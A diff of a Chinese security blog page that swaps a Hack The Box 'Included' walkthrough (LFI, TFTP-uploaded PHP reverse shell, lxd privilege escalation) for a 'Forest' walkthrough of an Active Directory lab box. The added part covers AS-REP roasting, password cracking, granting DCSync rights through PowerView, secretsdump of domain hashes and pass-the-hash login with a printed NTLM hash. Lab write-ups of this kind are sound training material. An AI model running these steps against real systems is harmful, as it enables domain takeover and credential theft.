@@ -24,7 +24,7 @@
 
   
 
-  <title>htb Included靶机wp | 青丝未散</title>
+  <title>htb Forest靶机wp | 青丝未散</title>
 
   
 
@@ -101,16 +101,16 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">htb Included靶机wp</h1>
+          <h1 class="title-wrap">htb Forest靶机wp</h1>
           <h2 class="title-sub-wrap">
             <strong>qingsiweisan</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2024-02-12T12:41:38.000Z" itemprop="datePublished">2024-02-12</time>
+            <time  class="article-date" datetime="2024-03-12T12:57:33.000Z" itemprop="datePublished">2024-03-12</time>
           </h2>
           
             <h2 class="last-time">
               <span>最后更新于</span>
-              <time  class="article-updated" datetime="2024-02-12T19:28:37.932Z" itemprop="dateUpdated">2024-02-13</time>
+              <time  class="article-updated" datetime="2024-03-12T16:13:39.697Z" itemprop="dateUpdated">2024-03-13</time>
             </h2>
           
           
@@ -141,93 +141,95 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <h2 id="渗透阶段"><a href="#渗透阶段" class="headerlink" title="渗透阶段"></a>渗透阶段</h2><p>老规矩，挂vpn开机用nmap扫描</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sC -sV 10.129.95.185</span><br></pre></td></tr></table></figure>
+        <h1 id="htb-Forest靶机writeup"><a href="#htb-Forest靶机writeup" class="headerlink" title="htb-Forest靶机writeup"></a>htb-Forest靶机writeup</h1><p>今天做的是htb上Active Directory 101的第一台靶机Forest，难度是easy</p>
+<p>本篇wp大概思路参考<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/346287.html%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%EF%BC%8C%E5%A6%82%E6%9C%89%E9%9B%B7%E5%90%8C%E7%BA%AF%E5%B1%9E%E6%8A%84%E8%A2%AD">https://www.freebuf.com/articles/web/346287.html这篇文章，如有雷同纯属抄袭</a></p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>国际惯例上来先用nmap扫一下端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate=5000 -sC -sV -Pn -p- 10.10.10.161</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-sC <span class="comment">#使用默认脚本</span></span><br><span class="line">-sV	<span class="comment">#探测服务版本信息</span></span><br></pre></td></tr></table></figure>
+<img src="/2024/03/12/htb-Forest%E9%9D%B6%E6%9C%BAwp/image-20240312214342542.png" class="" title="image-20240312214342542">
 
-<img src="/2024/02/12/htb-Included%E9%9D%B6%E6%9C%BAwp/image-20240212214558133.png" class="" title="image-20240212214558133">
+<p>这里收集到135(rpc)、389(ldap)、445(smb)、5985(WinRM)端口都是开启的，而且有一个htb.local的域。</p>
+<p>用enum4linux枚举一下靶机信息。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux -a 10.10.10.161</span><br></pre></td></tr></table></figure>
 
-<p>80端口开着，再看第一个问题，再扫一下udp端口</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sU 10.129.95.185</span><br></pre></td></tr></table></figure>
+<img src="/2024/03/12/htb-Forest%E9%9D%B6%E6%9C%BAwp/image-20240312220834929.png" class="" title="image-20240312220834929">
 
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-sU <span class="comment">#扫描udp</span></span><br></pre></td></tr></table></figure>
+<p>可以看到枚举到一些用户名，其他还有一些域内组。</p>
+<p>用smb匿名登录看一下，没有发现有共享东西。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N -L \\10.10.10.161</span><br></pre></td></tr></table></figure>
 
-<img src="/2024/02/12/htb-Included%E9%9D%B6%E6%9C%BAwp/image-20240212222128893.png" class="" title="image-20240212222128893">
+<img src="/2024/03/12/htb-Forest%E9%9D%B6%E6%9C%BAwp/image-20240312221300276.png" class="" title="image-20240312221300276">
 
-<p>看扫描结果，第一题的答案是<code>tftp</code></p>
-<p>浏览器访问80端口，看样子是用到本地文件包含漏洞，第二题答案是<code>Local File Inclusion</code></p>
-<img src="/2024/02/12/htb-Included%E9%9D%B6%E6%9C%BAwp/image-20240212222147928.png" class="" title="image-20240212222147928">
+<p>用rpc用户枚举</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rpcclient -U -N &quot;&quot; 10.10.10.161</span><br><span class="line">enumdomusers </span><br></pre></td></tr></table></figure>
 
-<p>试一下读&#x2F;etc&#x2F;passwd，成功读到</p>
-<img src="/2024/02/12/htb-Included%E9%9D%B6%E6%9C%BAwp/image-20240212224212604.png" class="" title="image-20240212224212604">
+<img src="/2024/03/12/htb-Forest%E9%9D%B6%E6%9C%BAwp/image-20240312221710968.png" class="" title="image-20240312221710968">
 
-<p>第三题问题：TFTP 用于存储文件的默认系统文件夹是什么？</p>
-<p>直接google，第三题的答案是<code> /var/lib/tftpboot/</code></p>
-<p>tftp默认是不需要身份验证的，可以直接利用tftp来上传一个shell，然后用文件包含漏洞来读取，这样就可以得到一个可以利用的shell</p>
-<p>这里用的shell是这个项目：<a target="_blank" rel="noopener" href="https://github.com/pentestmonkey/php-reverse-shell">https://github.com/pentestmonkey/php-reverse-shell</a></p>
-<p>修改文件中ip地址和端口为反弹的地址<img src="/2024/02/12/htb-Included%E9%9D%B6%E6%9C%BAwp/image-20240212232706504.png" class="" title="image-20240212232706504"></p>
-<p>连接tftp，上传shell</p>
-<img src="/2024/02/12/htb-Included%E9%9D%B6%E6%9C%BAwp/image-20240212233751367.png" class="" title="image-20240212233751367">
+<p>可以看到和enum4linux枚举出来的信息一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F&#x27;[][]&#x27; &#x27;/user/&#123;print $2&#125;&#x27; user.txt &gt; userlist.txt</span><br></pre></td></tr></table></figure>
 
-<p>监听端口</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure>
+<p>将信息保存到user.txt然后用awk命令提取用户名到userlist.txt</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用用户名进行AS-REP Roasting攻击，获取账号的hash值，这里用的是impactet的GetNPUsers.py脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 impacket/examples/GetNPUsers.py -dc-ip 10.10.10.161 -no-pass -usersfile userlist.txt htb.local/</span><br></pre></td></tr></table></figure>
 
-<p>这里用目录穿越方式访问shell<img src="/2024/02/12/htb-Included%E9%9D%B6%E6%9C%BAwp/image-20240212234041607.png" class="" title="image-20240212234041607"></p>
-<p>shell成功反弹<img src="/2024/02/12/htb-Included%E9%9D%B6%E6%9C%BAwp/image-20240212234517197.png" class="" title="image-20240212234517197"></p>
-<p>运行命令获得交互式shell</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script /dev/null -c bash</span><br></pre></td></tr></table></figure>
+<img src="/2024/03/12/htb-Forest%E9%9D%B6%E6%9C%BAwp/image-20240312223320617.png" class="" title="image-20240312223320617">
 
-<img src="/2024/02/12/htb-Included%E9%9D%B6%E6%9C%BAwp/image-20240212234630691.png" class="" title="image-20240212234630691">
+<p>看结果提取到svc-alfresco用户的hash</p>
+<p>用john来破解本地的hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john test --wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
 
-<p>在&#x2F;var&#x2F;www&#x2F;html路径下的.htpasswd得到mike的密码</p>
-<img src="/2024/02/12/htb-Included%E9%9D%B6%E6%9C%BAwp/image-20240213010226995.png" class="" title="image-20240213010226995">
+<img src="/2024/03/12/htb-Forest%E9%9D%B6%E6%9C%BAwp/image-20240312223524295.png" class="" title="image-20240312223524295">
 
-<p>第四题答案<code>.htpasswd</code></p>
-<p>切换到mike账号</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su mike</span><br></pre></td></tr></table></figure>
+<p>得到密码为s3rvice</p>
+<p>使用evil-winrm登录，查找user的flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.161 -u svc-alfresc -p s3rvice</span><br></pre></td></tr></table></figure>
 
-<img src="/2024/02/12/htb-Included%E9%9D%B6%E6%9C%BAwp/image-20240213010535479.png" class="" title="image-20240213010535479">
+<img src="/2024/03/12/htb-Forest%E9%9D%B6%E6%9C%BAwp/image-20240312223912823.png" class="" title="image-20240312223912823">
 
-<p>得到user的flag</p>
-<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>查看mike权限，发现在lxd群组里，第五题答案是<code>lxd</code></p>
-<img src="/2024/02/12/htb-Included%E9%9D%B6%E6%9C%BAwp/image-20240213010807950.png" class="" title="image-20240213010807950">
+<h3 id="域内提权"><a href="#域内提权" class="headerlink" title="域内提权"></a>域内提权</h3><p>域的话先用bloodhound了解域内情况</p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></p>
+<p>bloodhound需要先启动neo4j</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">neo4j start</span><br></pre></td></tr></table></figure>
 
-<p>搜索lxd组用户的提权手段，本篇参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/YouthBelief/article/details/123548739">https://blog.csdn.net/YouthBelief/article/details/123548739</a></p>
-<p>把alpine镜像git clone到本地，第六题答案就是<code>alpine</code></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/saghul/lxd-alpine-builder.git</span><br></pre></td></tr></table></figure>
+<p>访问<a target="_blank" rel="noopener" href="http://localhost:7474/">http://localhost:7474</a>          输入neo4j  neo4j 作为账号密码，修改默认密码为自己定义的密码，启动bloodhound</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bloodhound --no-sandbox </span><br></pre></td></tr></table></figure>
 
-<p>执行build-alpine命令构建alpine镜像，需要root用户完成</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd lxd-alpine-builder</span><br><span class="line">sudo ./build-alpine</span><br></pre></td></tr></table></figure>
+<p>将项目内&#x2F;resources&#x2F;app&#x2F;Collectors&#x2F;SharpHound.exe文件上传到目标机内执行</p>
+<img src="/2024/03/12/htb-Forest%E9%9D%B6%E6%9C%BAwp/image-20240312225607691.png" class="" title="image-20240312225607691">
 
-<img src="/2024/02/12/htb-Included%E9%9D%B6%E6%9C%BAwp/image-20240213030649498.png" class="" title="image-20240213030649498">
+<p>运行成功后目录下会产生一个zip文件，把zip文件下载回攻击机，拖入bloodhound中查看域中环境。</p>
+<img src="/2024/03/12/htb-Forest%E9%9D%B6%E6%9C%BAwp/image-20240312230021902.png" class="" title="image-20240312230021902">
 
-<p>构建完成后需要将tar文件发送至目标设备</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+<p>在analysis中点击find Shortest Paths to Domain Admins寻找最短的路径到域管理员，可以看到svc-alfresco用户是属于Service Accounts组和Privileged IT Accounts组。</p>
+<img src="/2024/03/12/htb-Forest%E9%9D%B6%E6%9C%BAwp/image-20240312231318869.png" class="" title="image-20240312231318869">
 
-<p>在shell中下载攻击机的alpine-v3.19-x86_64-20240212_1405.tar.gz文件,下载路径为&#x2F;home&#x2F;mike</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://你的ip/alpine-v3.19-x86_64-20240212_1405.tar.gz</span><br></pre></td></tr></table></figure>
+<p>右键把svc-alfresco用户设置为已拥有，然后点击Shortest Path from Owned Principals</p>
+<img src="/2024/03/12/htb-Forest%E9%9D%B6%E6%9C%BAwp/image-20240312232010251.png" class="" title="image-20240312232010251">
 
-<img src="/2024/02/12/htb-Included%E9%9D%B6%E6%9C%BAwp/image-20240213032054837.png" class="" title="image-20240213032054837">
+<p>可以看到svc-alfresco在EXCH01.HTB.LOCAL上隶属于Account Operators组， Account Operators 对 Exchange Windows Permissions 组具有 Generic All 特权。所以我们可以创建一个新的用户test123加入”Exchange Windows Permissions”组，并且将他加入到rmu的本地组</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user test123  test123! /add /domain</span><br><span class="line">net group &#x27;Exchange Windows Permissions&#x27; test123  /add /domain</span><br><span class="line">net localgroup &#x27;Remote Management Users&#x27; test123  /add</span><br></pre></td></tr></table></figure>
 
-<p>导入镜像并初始化镜像</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lxc image import ./alpine-v3.19-x86_64-20240212_1405.tar.gz --alias test</span><br><span class="line">lxc init test test -c security.privileged=true</span><br></pre></td></tr></table></figure>
+<img src="/2024/03/12/htb-Forest%E9%9D%B6%E6%9C%BAwp/image-20240312233931005.png" class="" title="image-20240312233931005">
 
-<p>第七题答案就是<code>security.privileged=true</code></p>
-<img src="/2024/02/12/htb-Included%E9%9D%B6%E6%9C%BAwp/image-20240213032109804.png" class="" title="image-20240213032109804">
+<p>组 EXCHANGE WINDOWS <a href="mailto:&#x50;&#69;&#x52;&#77;&#x49;&#83;&#83;&#73;&#79;&#x4e;&#83;&#64;&#72;&#84;&#x42;&#x2e;&#x4c;&#x4f;&#x43;&#x41;&#x4c;">&#x50;&#69;&#x52;&#77;&#x49;&#83;&#83;&#73;&#79;&#x4e;&#83;&#64;&#72;&#84;&#x42;&#x2e;&#x4c;&#x4f;&#x43;&#x41;&#x4c;</a> 的成员有权修改域 HTB.LOCAL 上的 DACL（自由访问控制列表）。<br>切换到test123用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.161 -u test123 -p test123！</span><br></pre></td></tr></table></figure>
 
-<p>挂载磁盘</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc config device add test test disk source=/ path=/mnt/root recursive=true</span><br></pre></td></tr></table></figure>
+<p>用powerSploit中的powerview.ps1来滥用WriteDACL权限，创建凭证对象并授予DCSync权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upload powerview.ps1</span><br><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line">Add-DomainObjectAcl -PrincipalIdentity &#x27;test123&#x27; -TargetIdentity &#x27;DC=htb,DC=local&#x27; -Rights DCSync</span><br></pre></td></tr></table></figure>
 
-<p>第八题答案<code>/mnt/root/</code></p>
-<img src="/2024/02/12/htb-Included%E9%9D%B6%E6%9C%BAwp/image-20240213032157553.png" class="" title="image-20240213032157553">
+<img src="/2024/03/12/htb-Forest%E9%9D%B6%E6%9C%BAwp/image-20240313000511561.png" class="" title="image-20240313000511561">
 
-<p>启动镜像并进入镜像访问root文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">lxc start test</span><br><span class="line">lxc exec test /bin/sh</span><br><span class="line">id</span><br><span class="line">cd /mnt/root</span><br><span class="line">ls</span><br><span class="line">cd /root</span><br><span class="line">cat proof.txt</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
+<p>然后就可以使用test123的权限用secretsdump.py工具执行DCSync转存用户的NTLM哈希。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 impacket/examples/secretsdump.py test123:&#x27;test123!&#x27;@10.10.10.161</span><br></pre></td></tr></table></figure>
 
-<img src="/2024/02/12/htb-Included%E9%9D%B6%E6%9C%BAwp/image-20240213032544554.png" class="" title="image-20240213032544554">
+<img src="/2024/03/12/htb-Forest%E9%9D%B6%E6%9C%BAwp/image-20240313000817608.png" class="" title="image-20240313000817608">
 
-<p>最后提交两个flag通关靶机</p>
+<p>然后获得hash就可以用evil-winrm来pth登录administror</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.161 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/12/htb-Forest%E9%9D%B6%E6%9C%BAwp/image-20240313001117753.png" class="" title="image-20240313001117753">
+
+<p>获得administror的flag</p>
 
       </section>
 
@@ -235,20 +237,20 @@
       
         <nav class="article-nav">
           
+          
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
     
     <div class="card-text">
       
-        <a href="/2024/03/12/htb-Forest%E9%9D%B6%E6%9C%BAwp/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">htb Forest靶机wp</h2>
+        <a href="/2024/02/12/htb-Included%E9%9D%B6%E6%9C%BAwp/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">htb Included靶机wp</h2>
         </a>
       
-      <div class="card-text--row">Newer</div>
+      <div class="card-text--row">Older</div>
     </div>
   </article>
 </div>
-          
           
         </nav>
       
